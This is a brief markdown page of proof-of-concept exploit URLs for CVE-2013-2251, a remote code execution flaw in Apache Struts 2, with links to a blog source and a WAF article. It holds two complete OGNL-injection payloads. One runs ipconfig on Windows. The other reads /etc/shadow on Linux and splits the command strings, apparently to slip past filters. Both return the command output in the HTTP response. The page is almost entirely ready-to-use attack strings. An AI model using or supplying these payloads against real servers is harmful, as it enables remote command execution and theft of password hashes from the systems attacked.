# PoCs

## CVE-2013-2251 :

### Executing ipconfig (Windows)

``http://10.1.1.206:8080/struts2-blank/example/X.action?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cmd.exe%27,%27/c%20ipconfig.exe%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29} ``

Source : http://blog.opensecurityresearch.com/2014/02/attacking-struts-with-cve-2013-2251.html

### Executing cat /etc/shadow (Linux)

``http://10.1.1.206:8080/struts2-blank/example/X.action?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{'c'%2b'at','/et'%2b'c/sha'%2b'dow'}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}``

## More :

https://waf.ninja/struts2-vulnerability-evolution/

